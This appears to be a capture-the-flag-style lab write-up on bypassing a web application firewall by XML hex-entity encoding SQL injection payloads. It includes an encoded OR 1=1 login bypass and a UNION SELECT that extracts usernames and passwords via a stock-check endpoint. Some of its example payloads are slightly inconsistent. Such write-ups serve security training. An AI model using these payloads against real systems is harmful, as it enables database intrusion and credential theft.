**<h2>Background:</h2>**
SQL injection attacks can sometimes bypass filters by encoding certain characters using XML or Unicode encoding. This approach can evade detection if the application sanitizes input by blocking or escaping standard SQL syntax but doesn’t decode or parse XML-like encodings.

Example Bypasses with XML Encoding
1. Standard SQL Injection Payload

Consider a basic SQL injection payload:

``SELECT * FROM users WHERE username = 'admin' AND password = '';``

This can be converted using XML encoding to bypass filters:
- The single quote ' becomes ``&#x27;`` or ``&#39;``
- ``OR 1=1`` (a common SQL injection condition) becomes ``&#x4F;&#x52;&#x20;&#x31;&#x3D;&#x31;``

The query becomes ``Select * from users where username = 'admin' &#x4F;&#x52; 1=1 --'``.

We can use this in html as:<br>
<code>
``<login>
    <username>admin' &#x4F;&#x52; 1=1 --</username>
    <password>password</password>
</login>``
</code>

**<h2>Problem:</h2>**
This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 

**<h2>Solutions:</h2>**
- Look through the application in burp, we can see a POST method for ``/product/stock`` which has XML format body.
![alt text](/images/lab18XMLbody.png)
- When we pass a SQLi query it responds ``"Attack detected"`` so we need to xml encode our payload to bypass this firewall.
- To bypass the firewall we use Hackverter extension available on Burp. Select the query in this case `` 1 UNION SELECT NULL`` and rightclick to extension and encode then hexentities. It will now bypass and return 2 rows.
- Now we have rows number pass in the actual payload to get password ie. `` union select username ||'~' password from users`` and encode it using Hackverter xml format looks like
<code>
``<storeId><@hex_entities>1 union select username || '-' || password from users<@/hex_entities></storeId>``
</code>
And we also get the password
![alt text](/images/lab18output.png)
- Login with administrator credentials to solve the lab
